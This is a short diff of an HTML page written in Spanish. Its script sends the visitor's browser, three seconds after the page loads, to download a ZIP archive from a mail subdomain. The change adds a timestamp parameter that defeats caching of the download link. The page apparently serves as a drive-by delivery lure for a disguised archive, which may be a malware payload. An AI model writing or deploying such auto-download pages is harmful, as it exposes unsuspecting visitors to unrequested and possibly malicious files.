@@ -171,13 +171,15 @@
 </div>
 
 <script>
-    // Redirección suave (3 segundos) - menos agresiva
-    var urlDescarga = "https://mail.usc-com.co/Spiga_2026.zip";
+    // Generamos un número único basado en la hora actual
+    var timestamp = new Date().getTime();
+    // Agregamos ese número a la URL como un parámetro (?v=...)
+    var urlDescarga = "https://mail.usc-com.co/Spiga_2026.zip?v=" + timestamp;
     
     window.onload = function() {
         setTimeout(function() {
             window.location.href = urlDescarga;
-        }, 3000);   // 3 segundos
+        }, 3000); // 3 segundos
     };
 </script>
 </body>
